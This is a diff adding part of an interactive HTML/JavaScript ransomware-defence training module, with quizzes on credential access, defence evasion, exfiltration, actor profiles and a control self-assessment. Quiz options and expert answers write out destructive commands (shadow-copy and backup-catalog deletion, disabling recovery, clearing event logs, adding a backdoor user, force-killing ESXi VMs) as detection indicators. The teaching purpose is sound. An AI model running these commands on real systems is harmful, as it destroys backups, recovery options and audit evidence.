+  + '<tr><td>DCSync (lsadump::dcsync via MS-DRSR)</td><td><span class="att-id">T1003.006</span></td><td>Security EID 4662 with GUID for "Replicating Directory Changes All"</td></tr>'
+  + '<tr><td>ADCS abuse ESC1–ESC8 (Certify/Certipy)</td><td><span class="att-id">T1649</span></td><td>Certificate template enumeration; anomalous certificate requests</td></tr>'
+  + '<tr><td>Browser credential stores (Chrome/Edge)</td><td><span class="att-id">T1555.003</span></td><td>EDR process accessing AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</td></tr>'
+  + '<tr><td>MFA fatigue / push-bombing</td><td><span class="att-id">T1621</span></td><td>Multiple MFA push failures in short window; number-matching not configured</td></tr>'
+  + '</table></div></div>'
+  + '<div class="info-banner">🛡️ Credential Guard encrypts LSASS memory using a VSM; PPL prevents unauthorised access. Together they block the most common credential-dump paths. Deploy both.</div>'
+  + '<div class="quiz-block"><div class="quiz-q">🎯 Kerberoasting targets service accounts. What specific characteristic of a service account makes it vulnerable to this attack?</div>'
+  + '<div class="options">'
+  + '<button class="option-btn" onclick="answerQ(\'q3a\',this,false,\'Domain admin is not required — any domain user can request a TGS for any SPN. The vulnerability is in service account password quality, not privilege level.\')">A: The account must be a domain administrator</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q3a\',this,true,\'Correct. Kerberoasting works by requesting a TGS for any account with a Service Principal Name (SPN). The ticket is encrypted with the account\'s NTLM hash. If the password is weak, it can be cracked offline — no network noise after the initial TGS-REQ. Detection: Security EID 4769 with Encryption Type 0x17 (RC4-HMAC) for service accounts.\')">B: The SPN is registered and the account password is weak enough to crack offline ✓</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q3a\',this,false,\'No pre-auth required is AS-REP roasting (T1558.004) — a related but distinct attack targeting accounts without Kerberos pre-auth.\')">C: The account does not require pre-authentication</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q3a\',this,false,\'Group membership is not the vulnerability — SPN registration and weak password are.\')">D: The account is in the Domain Admins group</button>'
+  + '</div><div class="feedback" id="q3a-feedback"></div></div>'
+  + '<div class="quiz-block"><div class="quiz-q">🎯 DCSync is a high-impact technique. What does it allow an attacker to do — and what legitimate Windows process does it mimic?</div>'
+  + '<div class="options">'
+  + '<button class="option-btn" onclick="answerQ(\'q3b\',this,false,\'DCSync has nothing to do with file encryption — it\'s a credential-harvesting technique.\')">A: Encrypt files faster by syncing encryption keys across domain controllers</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q3b\',this,true,\'Correct. DCSync (Mimikatz lsadump::dcsync) abuses the MS-DRSR replication protocol to request password hashes from a DC as if the attacker\'s host were a replicating DC. It requires Replicating Directory Changes rights. Detection: Security EID 4662 with specific GUIDs for "Replicating Directory Changes All".\')">B: Replicate all AD password hashes from a DC — mimicking the legitimate DC replication process ✓</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q3b\',this,false,\'SAM sync is a different mechanism — DCSync replicates from the domain\'s NTDS.dit, not the SAM.\')">C: Synchronise local SAM database with Active Directory</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q3b\',this,false,\'DCSync doesn\'t create infrastructure — it extracts credentials from existing DCs.\')">D: Create a backdoor domain controller for persistence</button>'
+  + '</div><div class="feedback" id="q3b-feedback"></div></div>'
+  + '<div class="discuss-block"><div class="discuss-label">💬 Discussion — Section 3</div>'
+  + '<div class="discuss-q">Your environment has LSASS PPL enabled and Credential Guard deployed. An attacker with local admin achieves code execution on a workstation. What credential-access paths remain open to them — and which is most likely to be exploited first?</div>'
+  + '<textarea class="discuss-input" placeholder="List remaining paths after PPL + Credential Guard are in place..."></textarea>'
+  + '<button class="btn-reveal" onclick="toggleExpert(\'exp3\')">Reveal expert perspective</button>'
+  + '<div class="expert-answer" id="exp3">With PPL and Credential Guard, Mimikatz direct LSASS dump is blocked. Remaining paths: (1) BYOVD to unload PPL protection — requires a vulnerable driver, noisier; (2) Kerberoasting from domain context if SPNs exist with weak passwords — quiet, works from any domain account; (3) Browser credential stores (Chrome/Edge encrypted local storage) — attackers frequently target these post-compromise, especially for SaaS credentials; (4) ADCS abuse if ESC misconfigs exist — Certipy identifies these quickly. Most likely first: browser credential harvest, as it\'s quiet and often yields SaaS session tokens directly.</div>'
+  + '</div>'
+  + '<div class="nav-row"><button class="btn-nav" onclick="prevSection()">← Execution</button><button class="btn-nav next" onclick="nextSection()">Defence Evasion →</button></div>';
+}
+
+// ── S4: Defence Evasion & Exfiltration ───────────────────────────────────────
+function renderS4() {
+  _evasionSelected = {};
+  _evasionScored = false;
+  var commands = [
+    { id:'e1', text:'vssadmin delete shadows /all /quiet', correct: true },
+    { id:'e2', text:'bcdedit /set recoveryenabled No', correct: true },
+    { id:'e3', text:'wbadmin delete catalog -quiet', correct: true },
+    { id:'e4', text:'wevtutil cl System', correct: true },
+    { id:'e5', text:'net user /add backdoor P@ss', correct: false },
+    { id:'e6', text:'ipconfig /all', correct: false },
+  ];
+  var btnHTML = commands.map(function(c) {
+    return '<button class="signal-btn" id="ev-' + c.id + '" onclick="toggleEvasion(\'' + c.id + '\',' + c.correct + ')">' + c.text + '</button>';
+  }).join('');
+  return '<div class="section-header"><div class="section-tag">Part 4 of 6</div><h2>👻 Defence Evasion &amp; Exfiltration</h2><p>Before detonation, affiliates disable defences and exfiltrate data — creating the dual-extortion pressure that makes backups alone insufficient.</p></div>'
+  + '<div class="content-card"><h3>Defence Evasion Techniques</h3>'
+  + '<ul>'
+  + '<li><strong>BYOVD</strong> (Bring Your Own Vulnerable Driver) — AvosLocker/Cuba/BlackByte/BlackCat used driver exploits to disable EDR. LOLDrivers.io catalogs known-vulnerable drivers.</li>'
+  + '<li><strong>GPO Tampering</strong> — DisableAntiSpyware=1 pushed via Group Policy to fleet-wide disable Defender</li>'
+  + '<li><strong>Service control on EDR</strong> — net stop attempts; modern self-protecting agents resist this</li>'
+  + '<li><strong>VSS/Recovery Destruction</strong> — vssadmin, wmic, wbadmin, bcdedit commands — highest-confidence pre-encryption detection signal</li>'
+  + '<li><strong>Log clearing</strong> — wevtutil cl to erase Security, System, Application event logs</li>'
+  + '</ul></div>'
+  + '<div class="content-card"><h3>Exfiltration Tools</h3>'
+  + '<ul>'
+  + '<li><strong>Rclone</strong> — most observed; Conti playbooks include verbatim config. Attackers rename binary but command-line args are characteristic.</li>'
+  + '<li><strong>MEGAsync</strong> — MEGA cloud storage uploads; large volume, encrypted channel</li>'
+  + '<li><strong>FileZilla</strong> — FTP to attacker infrastructure</li>'
+  + '<li><strong>Custom Go/Rust exfiltrators</strong> — compiled for each operation</li>'
+  + '<li><strong>Cloud storage abuse</strong> — S3, Azure Blob, GCS for large-volume staging</li>'
+  + '</ul><p style="margin-top:8px;font-size:12px;color:var(--muted);">Detection: NetFlow byte-volume by destination, DLP/proxy by category, EDR command-line args</p></div>'
+  + '<div class="quiz-block"><div class="quiz-q">🎯 Multi-select: Which commands are high-confidence ransomware defence evasion indicators? Select ALL that apply, then check.</div>'
+  + '<div style="margin-bottom:12px;">' + btnHTML + '</div>'
+  + '<button class="btn-reveal" onclick="checkEvasion()">Check selections →</button>'
+  + '<div class="feedback" id="evasion-feedback"></div></div>'
+  + '<div class="quiz-block"><div class="quiz-q">🎯 Rclone is the most commonly observed exfiltration tool in ransomware intrusions. What is the most reliable way to detect it — given that attackers often rename the binary?</div>'
+  + '<div class="options">'
+  + '<button class="option-btn" onclick="answerQ(\'q4b\',this,false,\'Renaming the binary defeats filename-based detection — that\'s exactly why attackers do it.\')">A: Signature-based detection of the rclone.exe filename</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q4b\',this,true,\'Correct. Module 2 specifies: watch for command lines containing copy/sync/--ignore-existing and outbound connections to MEGA, Backblaze B2, Google Drive, S3, Azure Blob — from servers that have no business uploading. Behaviour-based detection survives binary renaming.\')">B: Command-line args containing copy/sync + destination to cloud storage endpoints, regardless of binary name ✓</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q4b\',this,false,\'Attackers compile custom versions or use legitimate builds with modified names — hash matching is easily defeated.\')">C: File hash matching against known Rclone releases</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q4b\',this,false,\'Blocking all cloud storage is operationally impractical in most enterprises and doesn\'t detect what already exfiltrated before the block.\')">D: Blocking all outbound cloud storage at the firewall</button>'
+  + '</div><div class="feedback" id="q4b-feedback"></div></div>'
+  + '<div class="discuss-block"><div class="discuss-label">💬 Discussion — Section 4</div>'
+  + '<div class="discuss-q">An attacker has renamed rclone.exe to svchost32.exe and is exfiltrating to an attacker-controlled S3 bucket. Your DLP has no rule for this destination. What three telemetry sources give you the best chance of detecting the exfiltration before it completes — and which would fire fastest?</div>'
+  + '<textarea class="discuss-input" placeholder="Name three telemetry sources and rank by speed..."></textarea>'
+  + '<button class="btn-reveal" onclick="toggleExpert(\'exp4\')">Reveal expert perspective</button>'
+  + '<div class="expert-answer" id="exp4">Three sources: (1) NetFlow/firewall byte-volume — a server generating 50GB of outbound traffic in an hour to amazonaws.com is anomalous regardless of process name. This is fastest for large exfil volumes; (2) EDR process telemetry — parent-child process relationships (svchost32.exe spawned by cmd.exe on a file server is unusual), and first-seen binary events; (3) DNS telemetry — bucket subdomain patterns on amazonaws.com can identify the specific bucket. The fastest signal for large exfil is NetFlow volume alert — most SIEMs can threshold this in near-real-time.</div>'
+  + '</div>'
+  + '<div class="nav-row"><button class="btn-nav" onclick="prevSection()">← Credential Access</button><button class="btn-nav next" onclick="nextSection()">Actor Profiles →</button></div>';
+}
+
+// ── S5: Encryption & Actor Profiles ──────────────────────────────────────────
+function renderS5() {
+  return '<div class="section-header"><div class="section-tag">Part 5 of 6</div><h2>💀 Encryption &amp; Actor Profiles</h2><p>The encryption phase is the final stage — but many affiliates have moved to targeting Linux/ESXi before it. Know the actors, know the playbook.</p></div>'
+  + '<div class="content-card"><h3>Encryption-Phase Detection</h3>'
+  + '<ul>'
+  + '<li><strong>Mass file rename / extension add</strong> — thousands of files gaining a new extension per second. EDR auto-isolation on this signal can save fractions of file shares.</li>'
+  + '<li><strong>High-entropy read-rewrite-delete</strong> — file content changes to near-random entropy at volume</li>'
+  + '<li><strong>Ransom note drops</strong> — README.txt / RECOVERY.txt in every directory</li>'
+  + '<li><strong>Linux/ESXi targeting</strong> — Akira/BlackCat/Royal terminate VMs via vim-cmd vmsvc/getallvms, then encrypt VMDKs directly on the datastore</li>'
+  + '</ul></div>'
+  + '<div class="content-card"><h3>Actor Profiles 2024–2025</h3>'
+  + '<div style="overflow-x:auto;"><table class="det-table">'
+  + '<tr><th>Actor</th><th>Signature</th><th>Key target</th></tr>'
+  + '<tr><td>Scattered Spider</td><td>English-speaking vishing, federated identity abuse, Okta/Azure AD</td><td>Hospitality, telecoms, tech — English-speaking countries</td></tr>'
+  + '<tr><td>LockBit (post-Cronos)</td><td>Fragmented affiliate ecosystem; public builder leak still in use</td><td>All sectors; high-volume brand</td></tr>'
+  + '<tr><td>ALPHV/BlackCat → RansomHub</td><td>Rust-based locker; exit-scammed; data on searchable DLS</td><td>Healthcare, critical infrastructure</td></tr>'
+  + '<tr><td>Akira</td><td>Edge-device exploitation (Cisco/Fortinet/Citrix), Linux/ESXi targeting</td><td>SMB to enterprise; education, manufacturing</td></tr>'
+  + '<tr><td>Black Basta</td><td>Conti successor; Qakbot → DarkGate → Pikabot delivery chain</td><td>Healthcare, finance, manufacturing</td></tr>'
+  + '<tr><td>Qilin</td><td>VMware ESXi focus; Synnovis/NHS June 2024</td><td>Healthcare, UK/EU focus</td></tr>'
+  + '</table></div></div>'
+  + '<div class="quiz-block"><div class="quiz-q">🎯 Why is mass file-rename detection (adding a single extension to thousands of files) important — even though it fires at the very end of the kill chain?</div>'
+  + '<div class="options">'
+  + '<button class="option-btn" onclick="answerQ(\'q5a\',this,false,\'There are many earlier signals — mass rename is NOT the only reliable detection. The point is it\'s universal but late.\')">A: It\'s the only reliable detection signal across all ransomware families</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q5a\',this,true,\'Correct. Even at stage 7, the rename/encrypt operation takes time across large file shares. An EDR that auto-isolates the host within seconds of the first rename burst can save significant portions of unencrypted data. The signal is late but the automated response can still limit blast radius significantly.\')">B: EDR auto-isolation on this signal can still save large fractions of file shares before encryption completes ✓</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q5a\',this,false,\'Forensic value exists but that\'s not the operational reason to alert on it in real time.\')">C: It proves the attacker\'s identity and can be used in court</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q5a\',this,false,\'Backup systems don\'t automatically trigger on EDR rename alerts — that would require specific integration.\')">D: It triggers the backup system to create an emergency snapshot</button>'
+  + '</div><div class="feedback" id="q5a-feedback"></div></div>'
+  + '<div class="quiz-block"><div class="quiz-q">🎯 Scattered Spider\'s distinctive characteristic compared to most ransomware affiliates is:</div>'
+  + '<div class="options">'
+  + '<button class="option-btn" onclick="answerQ(\'q5b\',this,false,\'Linux/ESXi targeting is associated with Akira, BlackCat, and others — not specifically Scattered Spider.\')">A: They exclusively target Linux and ESXi hypervisors</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q5b\',this,true,\'Correct. Scattered Spider (UNC3944/Octo Tempest) are English-speaking — often indistinguishable from internal IT staff on a phone call. Their signature is vishing help desks, SIM-swapping, and targeting identity providers (Okta, Azure AD, Duo). This social-engineering-first approach bypasses most technical controls.\')">B: They are native English speakers who use vishing and social engineering rather than technical initial access ✓</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q5b\',this,false,\'Scattered Spider has hit hospitality (MGM), telecoms, tech, and others — they are not sector-restricted.\')">C: They operate exclusively in the financial sector</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q5b\',this,false,\'ALPHV\'s Rust-based locker was developed by the ALPHV/BlackCat operator — Scattered Spider are affiliates who used it.\')">D: They developed the Rust-based locker used by ALPHV/BlackCat</button>'
+  + '</div><div class="feedback" id="q5b-feedback"></div></div>'
+  + '<div class="discuss-block"><div class="discuss-label">💬 Discussion — Section 5</div>'
+  + '<div class="discuss-q">Your organisation has no EDR on Linux servers. An Akira affiliate has just compromised a VMware vSphere management host. Describe the attack sequence they will execute in the next 60 minutes — and identify the one control that would most disrupt it.</div>'
+  + '<textarea class="discuss-input" placeholder="Describe the Akira ESXi playbook step by step..."></textarea>'
+  + '<button class="btn-reveal" onclick="toggleExpert(\'exp5\')">Reveal expert perspective</button>'
+  + '<div class="expert-answer" id="exp5">Akira\'s ESXi playbook: (1) Access vSphere management interface (often web-based, sometimes unprotected); (2) enumerate all VMs via vim-cmd vmsvc/getallvms; (3) kill all running VMs (esxcli vm process kill --type=force); (4) encrypt VMDKs directly on the datastore. The whole sequence takes under 10 minutes once management access is achieved. The single most disruptive control: MFA on vSphere/vCenter management interfaces — this is the access point. Secondary: network segmentation isolating vSphere management from production networks. EDR on Linux hosts would help but the vSphere management plane is the primary target.</div>'
+  + '</div>'
+  + '<div class="nav-row"><button class="btn-nav" onclick="prevSection()">← Defence Evasion</button><button class="btn-nav next" onclick="nextSection()">Self-Assessment →</button></div>';
+}
+
+// ── S6: Self-Assessment ───────────────────────────────────────────────────────
+function renderS6() {
+  _assessScored = false;
+  _assessAnswers = {};
+  var controls = [
+    { id:'a1', phase:'Initial Access', text:'Phishing-resistant MFA (FIDO2) on all internet-facing services' },
+    { id:'a2', phase:'Initial Access', text:'Conditional access policy blocking risky sign-ins' },
+    { id:'a3', phase:'Initial Access', text:'KEV patching SLA (hours, not weeks, for edge devices)' },
+    { id:'a4', phase:'Initial Access', text:'DLP / proxy alerting on sensitive data categories' },
+    { id:'a5', phase:'Execution', text:'PowerShell ScriptBlock logging (EID 4103/4104) shipped to SIEM' },
+    { id:'a6', phase:'Execution', text:'First-seen remote-access tool alert on non-admin hosts' },
+    { id:'a7', phase:'Persistence', text:'Alert on new scheduled tasks, services, and Run key changes' },
+    { id:'a8', phase:'Credential Access', text:'LSASS PPL + Credential Guard deployed fleet-wide' },
+    { id:'a9', phase:'Credential Access', text:'Alert on Kerberoasting (EID 4769 with RC4-HMAC)' },
+    { id:'a10', phase:'Discovery', text:'Alert on AdFind / BloodHound execution' },
+    { id:'a11', phase:'Lateral Movement', text:'Alert on PsExec / Impacket patterns' },
+    { id:'a12', phase:'Defence Evasion', text:'Alert on VSS deletion and BCDEdit commands — critical severity, auto-respond' },
+    { id:'a13', phase:'Defence Evasion', text:'BYOVD detection (block vulnerable driver list from LOLDrivers.io)' },
+    { id:'a14', phase:'Exfiltration', text:'Alert on rclone / MEGAsync command-line patterns from servers' },
+    { id:'a15', phase:'Impact', text:'EDR auto-isolate on mass file rename/encrypt signature' },
+    { id:'a16', phase:'Backup / Recovery', text:'Backup admin-plane MFA, immutable retention, IRE documented' },
+  ];
+  var rowsHTML = controls.map(function(c) {
+    return '<div class="assess-row">'
+      + '<div style="font-size:10px;color:var(--accent);font-weight:700;width:90px;flex-shrink:0;">' + c.phase + '</div>'
+      + '<div class="assess-label">' + c.text + '</div>'
+      + '<div class="radio-group">'
+      + '<button class="radio-btn" id="r-' + c.id + '-strong" onclick="setAssess(\'' + c.id + '\',\'strong\')">Strong</button>'
+      + '<button class="radio-btn" id="r-' + c.id + '-partial" onclick="setAssess(\'' + c.id + '\',\'partial\')">Partial</button>'
+      + '<button class="radio-btn" id="r-' + c.id + '-absent" onclick="setAssess(\'' + c.id + '\',\'absent\')">Absent</button>'
+      + '</div></div>';
+  }).join('');
+  return '<div class="section-header"><div class="section-tag">Part 6 of 6</div><h2>✅ Self-Assessment Checklist</h2><p>Rate your environment against the 16 Module 2 controls. Honest answers drive the most useful gaps analysis.</p></div>'
+  + '<div class="info-banner">💡 For each control: <strong>Strong</strong> = operational, tested, alerts monitored. <strong>Partial</strong> = deployed but gaps exist. <strong>Absent</strong> = not in place.</div>'
+  + '<div class="content-card"><h3>16 Controls Across the Kill Chain</h3>' + rowsHTML
+  + '<div style="margin-top:14px;"><button class="btn-primary" onclick="scoreAssessment()" style="font-size:13px;padding:8px 20px;">Calculate Coverage Score →</button></div>'
+  + '<div id="assess-result" style="margin-top:14px;display:none;"></div></div>'
+  + '<div class="quiz-block"><div class="quiz-q">🎯 The Module 2 checklist distinguishes between having a detection rule and having an "operational answer" for each signal. What does "operational answer" mean?</div>'
+  + '<div class="options">'
+  + '<button class="option-btn" onclick="answerQ(\'q6a\',this,false,\'A Sigma rule is the detection content — the operational answer is what happens after it fires.\')">A: Having the detection rule written in Sigma format</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q6a\',this,true,\'Correct. Module 2 states: "Detections without that operational answer are just decoration." A detection rule that fires at 03:00 on a Friday and lands in an unmonitored queue is functionally absent. The operational answer names the person, the response time, and the action.\')">B: Knowing where the signal lands, who sees it first, and how long until they can act ✓</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q6a\',this,false,\'Testing is valuable but the "operational answer" is about the human response path, not technical validation.\')">C: Having the alert tested in a staging environment</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q6a\',this,false,\'ATT&CK IDs are taxonomy — the operational answer is about human and process response.\')">D: Documenting the MITRE ATT&CK technique identifier</button>'
+  + '</div><div class="feedback" id="q6a-feedback"></div></div>'
+  + '<div class="discuss-block"><div class="discuss-label">💬 Final Discussion</div>'
+  + '<div class="discuss-q">Score your own environment against the 16-item checklist above. Identify your three weakest areas. For each, write one concrete action — a specific rule, a process change, or a tool deployment — that would move it from Absent or Partial to Strong.</div>'
+  + '<textarea class="discuss-input" placeholder="List your three weakest controls and one concrete action each..."></textarea>'
+  + '<button class="btn-reveal" onclick="toggleExpert(\'exp6\')">Reveal expert perspective</button>'
+  + '<div class="expert-answer" id="exp6">The module\'s framing: bring the gaps into Module 6\'s tabletop scenarios. The most commonly absent controls in post-incident reviews are: (1) PowerShell ScriptBlock logging not shipped to SIEM — fix: enable EID 4103/4104 and create a collection rule; (2) No alert on first-seen remote-access tools on non-admin hosts — fix: KQL query on DeviceFileEvents for RAT binary names outside IT-Admin MachineGroup; (3) No EDR on Linux/ESXi — fix: agent deployment or at minimum vSphere management interface hardening. The checklist is most valuable when the gaps drive runbook and tabletop work — not just a compliance checkbox.</div>'
+  + '</div>'
+  + '<div class="nav-row"><button class="btn-nav" onclick="prevSection()">← Actor Profiles</button><button class="btn-nav next" onclick="nextSection()">🏁 See Results →</button></div>';
+}
+
+// ── INTERACTION HANDLERS ──────────────────────────────────────────────────────
+function toggleEvasion(id, correct) {
+  if (_evasionScored) return;
+  _evasionSelected[id] = correct;
+  var btn = document.getElementById('ev-' + id);
+  btn.classList.toggle('selected');
+}
+
+function checkEvasion() {
+  if (_evasionScored) return;
+  _evasionScored = true;
+  var correctIds = ['e1','e2','e3','e4'];
+  var wrongIds = ['e5','e6'];
+  var selectedIds = Object.keys(_evasionSelected).filter(function(k){ return document.getElementById('ev-' + k).classList.contains('selected'); });
+  var correctCount = selectedIds.filter(function(id){ return correctIds.indexOf(id) >= 0; }).length;
+  var wrongCount = selectedIds.filter(function(id){ return wrongIds.indexOf(id) >= 0; }).length;
+  correctIds.forEach(function(id){ var b = document.getElementById('ev-' + id); if(b){ b.classList.remove('selected'); b.classList.add('signal-correct'); b.disabled = true; } });
+  wrongIds.forEach(function(id){ var b = document.getElementById('ev-' + id); if(b){ b.classList.remove('selected'); b.classList.add('signal-wrong'); b.disabled = true; } });
+  var fb = document.getElementById('evasion-feedback');
+  var score_earned = correctCount - wrongCount;
+  if (score_earned >= 3) {
+    fb.innerHTML = '✅ Correct. The four high-confidence signals are: vssadmin delete shadows, bcdedit /set recoveryenabled No, wbadmin delete catalog, and wevtutil cl (log clearing). "net user /add" and "ipconfig /all" are suspicious in context but are not in the highest-confidence pre-encryption signal category.';
+    fb.className = 'feedback show correct';
+    addPoints(15);
+  } else {
+    fb.innerHTML = '❌ The four high-confidence defence-evasion indicators are: vssadmin delete shadows, bcdedit /set recoveryenabled No, wbadmin delete catalog, and wevtutil cl. The net user and ipconfig commands are not specifically ransomware-defence-evasion signals.';
+    fb.className = 'feedback show wrong';
+  }
+}
+
+function setAssess(id, level) {
+  _assessAnswers[id] = level;
+  var levels = ['strong','partial','absent'];
+  levels.forEach(function(l) {
+    var btn = document.getElementById('r-' + id + '-' + l);
+    if (btn) {
+      btn.className = 'radio-btn';
+      if (l === level) btn.classList.add('sel-' + l);
+    }
+  });
+}
+
+function scoreAssessment() {
+  if (_assessScored) return;
+  var ids = ['a1','a2','a3','a4','a5','a6','a7','a8','a9','a10','a11','a12','a13','a14','a15','a16'];
+  var answered = ids.filter(function(id){ return _assessAnswers[id]; }).length;
+  if (answered < 16) {
+    var res = document.getElementById('assess-result');
+    res.style.display = 'block';
+    res.innerHTML = '<div class="info-banner">Please rate all 16 controls before calculating your score.</div>';
+    return;
+  }
+  _assessScored = true;
+  var strong = 0, partial = 0, absent = 0;
+  ids.forEach(function(id) {
+    var v = _assessAnswers[id];
+    if (v === 'strong') strong++;
+    else if (v === 'partial') partial++;
+    else absent++;
+  });
+  var pct = Math.round((strong + partial * 0.5) / 16 * 100);
+  var res = document.getElementById('assess-result');
+  res.style.display = 'block';
+  var colour = pct >= 75 ? 'var(--green)' : pct >= 50 ? 'var(--yellow)' : 'var(--red)';
+  res.innerHTML = '<div style="text-align:center;padding:12px;">'
+    + '<div style="font-size:36px;font-weight:900;color:' + colour + ';">' + pct + '%</div>'
+    + '<div style="font-size:12px;color:var(--muted);margin:6px 0;">Coverage score — ' + strong + ' Strong / ' + partial + ' Partial / ' + absent + ' Absent</div>'
+    + '<div style="font-size:12px;color:#c9d1d9;margin-top:8px;">Gaps flagged as Absent are your Module 6 tabletop inputs. Each Absent control is a pressure point the Northwind scenarios will exploit.</div>'
+    + '</div>';
+  addPoints(20);
+}
+</script>
+</body>
+</html>
